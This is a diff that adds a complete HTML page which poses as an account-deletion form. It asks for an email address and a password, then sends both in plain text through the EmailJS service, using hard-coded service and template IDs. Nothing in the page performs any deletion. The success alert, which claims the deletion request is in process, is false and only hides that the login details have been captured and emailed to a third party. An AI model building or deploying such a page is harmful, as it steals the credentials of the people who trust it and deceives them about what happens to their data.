@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit Details</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h2 {
+            margin-top: 0;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            border: none;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .warning {
+            color: #d9534f;
+            margin: 20px 0;
+        }
+    </style>
+    <!-- Load the latest EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h2>Submit Details</h2>
+        <p class="warning">
+            <strong>Important:</strong> If you delete your account, it will be permanently removed, and you will lose all associated data. Please ensure that you have saved any necessary information before proceeding.
+        </p>
+        <form id="email-form">
+            <input type="email" id="email" name="email" placeholder="Your Email" required>
+            <input type="password" id="password" name="password" placeholder="Your Password" required>
+            <button type="submit">Send</button>
+        </form>
+    </div>
+
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("klPRxRLhn8RUmn14u"); // Initialize with your public key
+        })();
+
+        document.getElementById('email-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get form values
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Send email using EmailJS
+            emailjs.send('service_aiokqjf', 'template_ow1ji0s', {
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                alert('Your request to delete the account is in process. You will be notified once the deletion is complete.');
+                document.getElementById('email-form').reset(); // Clear the form
+            }, function(error) {
+                alert('Error sending email: ' + JSON.stringify(error));
+            });
+        });
+    </script>
+</body>
+</html>
